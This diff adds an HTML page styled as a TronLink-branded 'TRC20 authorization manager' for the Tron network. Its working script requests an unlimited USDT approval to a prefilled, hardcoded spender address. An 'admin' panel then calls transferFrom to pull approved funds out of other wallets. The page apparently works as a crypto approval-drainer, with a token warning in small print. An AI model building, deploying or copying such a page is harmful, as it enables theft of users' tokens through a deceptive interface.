@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRC20 授權管理助手 (Tron Network)</title>
+    <link rel="icon" href="https://www.tronlink.org/favicon.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- 引入 TronWeb SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; background: #0f172a; color: #f8fafc; }
+        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .gradient-text { background: linear-gradient(90deg, #ff0013, #ff4d5a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .tron-red { background-color: #ff0013; }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-6">
+
+    <div class="max-w-lg w-full glass rounded-3xl p-8 shadow-2xl border-t-4 border-red-600">
+        <!-- Header -->
+        <div class="text-center mb-8">
+            <h1 class="text-3xl font-bold gradient-text mb-2">TRC20 授權管理</h1>
+            <p class="text-slate-400 text-sm">波場 (Tron) 網絡代幣無限授權工具</p>
+        </div>
+
+        <!-- Wallet Connection -->
+        <div id="walletSection" class="mb-8">
+            <button id="connectBtn" class="w-full tron-red hover:bg-red-700 text-white font-semibold py-3 px-6 rounded-xl transition-all flex items-center justify-center gap-2">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
+                    <path fill-rule="evenodd" d="M17.707 9.293a1 1 0 010 1.414l-7 7a1 1 0 01-1.414 0l-7-7a1 1 0 011.414-1.414L10 14.586l6.293-6.293a1 1 0 011.414 0z" clip-rule="evenodd" />
+                </svg>
+                連接 TronLink 錢包
+            </button>
+            <p id="walletAddress" class="mt-3 text-center text-xs text-slate-500 hidden break-all"></p>
+        </div>
+
+        <!-- Form -->
+        <div id="approvalForm" class="space-y-6 opacity-50 pointer-events-none transition-opacity duration-300">
+            <div>
+                <label class="block text-sm font-medium text-slate-300 mb-2">1. 授權資產 (USDT 官方合約地址)</label>
+                <input type="text" id="tokenAddress" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" placeholder="T..." class="w-full bg-slate-800/50 border border-slate-700 rounded-xl py-3 px-4 text-white focus:outline-none focus:ring-2 focus:ring-red-500 transition-all">
+                <p class="text-[10px] text-slate-500 mt-1">這是 USDT 的官方管理中心，通常不需要修改。</p>
+            </div>
+
+            <div>
+                <label class="block text-sm font-medium text-slate-300 mb-2">2. 接收權限地址 (將獲得動用權的對象)</label>
+                <input type="text" id="spenderAddress" value="TRLP4sd9jvQKT2J2CgQLa1H75ScfXG1RBJ" placeholder="T..." class="w-full bg-slate-800/50 border border-slate-700 rounded-xl py-3 px-4 text-white focus:outline-none focus:ring-2 focus:ring-red-500 transition-all">
+                <p class="text-[10px] text-slate-500 mt-1">此地址在授權後，將可以從您的錢包轉走上述資產。</p>
+            </div>
+
+            <!-- Warning Card -->
+            <div class="bg-amber-900/20 border border-amber-500/30 rounded-xl p-4">
+                <div class="flex gap-3">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-amber-500 shrink-0" viewBox="0 0 20 20" fill="currentColor">
+                        <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
+                    </svg>
+                    <div>
+                        <p class="text-amber-500 text-xs font-bold uppercase tracking-wider">安全警告</p>
+                        <p class="text-amber-200/80 text-xs mt-1">「TRC20 無限授權」將允許目標地址永久動用此代幣。請務必確認目標合約或地址是可信的。</p>
+                    </div>
+                </div>
+            </div>
+
+            <button id="approveBtn" class="w-full bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-bold py-4 px-6 rounded-xl shadow-lg shadow-red-500/20 transition-all active:scale-95 mb-4">
+                執行 TRC20 無限授權
+            </button>
+
+            <button id="checkBtn" class="w-full bg-slate-700 hover:bg-slate-600 text-white font-semibold py-3 px-6 rounded-xl transition-all active:scale-95">
+                查詢目前授權額度
+            </button>
+        </div>
+
+        <!-- Admin Section (transferFrom) -->
+        <div id="adminSection" class="mt-10 pt-8 border-t border-slate-700 opacity-50 pointer-events-none transition-opacity duration-300">
+            <div class="text-center mb-6">
+                <h2 class="text-xl font-bold text-indigo-400 mb-1">管理員操作區</h2>
+                <p class="text-slate-500 text-[10px]">當您身為「接收權限地址」時，可在此提取已授權的資產</p>
+            </div>
+
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">被授權人的地址 (From Address)</label>
+                    <input type="text" id="fromAddress" placeholder="T..." class="w-full bg-slate-800/30 border border-slate-700/50 rounded-lg py-2 px-3 text-sm text-white focus:outline-none focus:ring-1 focus:ring-indigo-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">接收資產的地址 (To Address)</label>
+                    <input type="text" id="toAddress" placeholder="T..." class="w-full bg-slate-800/30 border border-slate-700/50 rounded-lg py-2 px-3 text-sm text-white focus:outline-none focus:ring-1 focus:ring-indigo-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">提取數量 (Amount)</label>
+                    <input type="number" id="transferAmount" placeholder="100" class="w-full bg-slate-800/30 border border-slate-700/50 rounded-lg py-2 px-3 text-sm text-white focus:outline-none focus:ring-1 focus:ring-indigo-500">
+                </div>
+                <button id="transferBtn" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3 px-6 rounded-xl transition-all active:scale-95 shadow-lg shadow-indigo-500/20">
+                    執行提取 (transferFrom)
+                </button>
+            </div>
+        </div>
+
+        <!-- Status Messages -->
+        <div id="status" class="mt-6 text-center text-sm"></div>
+    </div>
+
+    <script>
+        let tronWeb;
+
+        const connectBtn = document.getElementById('connectBtn');
+        const walletAddress = document.getElementById('walletAddress');
+        const approvalForm = document.getElementById('approvalForm');
+        const adminSection = document.getElementById('adminSection');
+        const approveBtn = document.getElementById('approveBtn');
+        const checkBtn = document.getElementById('checkBtn');
+        const transferBtn = document.getElementById('transferBtn');
+        const statusDiv = document.getElementById('status');
+
+        // 初始化與連接功能
+        async function connectWallet() {
+            // 1. 檢查是否安裝了 TronLink
+            if (!window.tronWeb) {
+                showStatus("未偵測到 TronLink，請先安裝擴充功能並重新整理頁面", "text-amber-400");
+                window.open("https://www.tronlink.org/", "_blank");
+                return;
+            }
+
+            try {
+                showStatus("正在請求連接錢包...", "text-indigo-400");
+                
+                // 2. 請求授權連接帳戶 (這是最標準的喚起方式)
+                const res = await window.tronWeb.request({ method: 'tron_requestAccounts' });
+                
+                if (res && res.code === 200) {
+                    tronWeb = window.tronWeb;
+                    const address = tronWeb.defaultAddress.base58;
+
+                    if (!address) {
+                        showStatus("錢包已連接但未取得地址，請解鎖錢包", "text-amber-400");
+                        return;
+                    }
+
+                    updateUIConnected(address);
+                } else {
+                    showStatus("使用者拒絕了連接請求", "text-red-400");
+                }
+            } catch (err) {
+                console.error("Connection Error:", err);
+                showStatus("連接發生錯誤: " + (err.message || "未知錯誤"), "text-red-400");
+            }
+        }
+
+        function updateUIConnected(address) {
+            walletAddress.innerText = `已連接波場地址: ${address}`;
+            walletAddress.classList.remove('hidden');
+            connectBtn.innerText = "TronLink 已連接";
+            connectBtn.classList.remove('tron-red');
+            connectBtn.classList.add('bg-emerald-600', 'hover:bg-emerald-500');
+            
+            approvalForm.classList.remove('opacity-50', 'pointer-events-none');
+            adminSection.classList.remove('opacity-50', 'pointer-events-none');
+            showStatus("已成功連接波場網絡", "text-emerald-400");
+        }
+
+        // 綁定點擊事件
+        connectBtn.addEventListener('click', connectWallet);
+
+        // 執行 TRC20 授權
+        approveBtn.addEventListener('click', async () => {
+            const tokenAddr = document.getElementById('tokenAddress').value.trim();
+            const spenderAddr = document.getElementById('spenderAddress').value.trim();
+
+            if (!tokenAddr.startsWith('T') || !spenderAddr.startsWith('T')) {
+                showStatus("請輸入有效的波場 (T 開頭) 地址", "text-red-400");
+                return;
+            }
+
+            try {
+                showStatus("正在請求授權，請在 TronLink 中確認...", "text-red-400");
+                
+                // 獲取代幣合約實例
+                const contract = await tronWeb.contract().at(tokenAddr);
+                
+                // TRC20 無限額度 (2^256 - 1)
+                // TronWeb 中通常使用大數或字符串表示
+                const infiniteAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+                // 調用 approve 函數
+                const transaction = await contract.approve(spenderAddr, infiniteAmount).send({
+                    feeLimit: 100000000 // 設定費用上限
+                });
+
+                showStatus("交易已發送，交易 ID: " + transaction.substring(0, 10) + "...", "text-indigo-400");
+                
+                // Tron 的確認通常很快，可以提示用戶去區塊瀏覽器查看
+                showStatus("🎉 授權指令已發送！請檢查錢包記錄確認結果。", "text-emerald-400 font-bold");
+            } catch (err) {
+                showStatus("操作失敗: " + (err.message || err), "text-red-400");
+                console.error(err);
+            }
+        });
+
+        // 查詢授權額度
+        checkBtn.addEventListener('click', async () => {
+            const tokenAddr = document.getElementById('tokenAddress').value.trim();
+            const spenderAddr = document.getElementById('spenderAddress').value.trim();
+
+            if (!tokenAddr.startsWith('T') || !spenderAddr.startsWith('T')) {
+                showStatus("請輸入有效的波場地址以供查詢", "text-red-400");
+                return;
+            }
+
+            try {
+                showStatus("正在查詢中...", "text-indigo-400");
+                const contract = await tronWeb.contract().at(tokenAddr);
+                const ownerAddr = tronWeb.defaultAddress.base58;
+                
+                const allowance = await contract.allowance(ownerAddr, spenderAddr).call();
+                // 處理 BigNumber
+                const amount = allowance.remaining ? allowance.remaining.toString() : allowance.toString();
+                
+                if (amount === "0") {
+                    showStatus("目前授權額度為 0", "text-amber-400");
+                } else if (amount.length > 20) {
+                    showStatus("目前為「無限授權」狀態", "text-emerald-400 font-bold");
+                } else {
+                    showStatus(`目前授權額度: ${amount}`, "text-emerald-400");
+                }
+            } catch (err) {
+                showStatus("查詢失敗: " + (err.message || err), "text-red-400");
+            }
+        });
+
+        // 執行管理員轉帳 (transferFrom)
+        transferBtn.addEventListener('click', async () => {
+            const tokenAddr = document.getElementById('tokenAddress').value.trim();
+            const fromAddr = document.getElementById('fromAddress').value.trim();
+            const toAddr = document.getElementById('toAddress').value.trim();
+            const amount = document.getElementById('transferAmount').value.trim();
+
+            if (!tokenAddr.startsWith('T') || !fromAddr.startsWith('T') || !toAddr.startsWith('T') || !amount) {
+                showStatus("請填寫完整的轉帳資訊", "text-red-400");
+                return;
+            }
+
+            try {
+                showStatus("正在請求提取資產...", "text-indigo-400");
+                const contract = await tronWeb.contract().at(tokenAddr);
+                
+                // 處理精度 (USDT 通常是 6 位小數)
+                // 為了簡單起見，這裡直接使用整數或由用戶輸入
+                const sunAmount = amount * 1000000; // 假設是 USDT
+
+                const transaction = await contract.transferFrom(fromAddr, toAddr, sunAmount).send({
+                    feeLimit: 100000000
+                });
+
+                showStatus("提取指令已發送！交易 ID: " + transaction.substring(0, 10) + "...", "text-emerald-400 font-bold");
+            } catch (err) {
+                showStatus("提取失敗: " + (err.message || err), "text-red-400");
+                console.error(err);
+            }
+        });
+
+        function showStatus(msg, colorClass) {
+            statusDiv.className = `mt-6 text-center text-sm ${colorClass}`;
+            statusDiv.innerText = msg;
+        }
+
+        // 定期檢查 TronLink 狀態
+        const checkTronLink = setInterval(() => {
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                // 如果已經授權過，自動連接
+                if (!tronWeb) {
+                    tronWeb = window.tronWeb;
+                    updateUIConnected(tronWeb.defaultAddress.base58);
+                }
+                clearInterval(checkTronLink);
+            }
+        }, 1000);
+
+        // 五秒後如果還沒偵測到也停止檢查，避免浪費資源
+        setTimeout(() => clearInterval(checkTronLink), 5000);
+    </script>
+</body>
+</html>
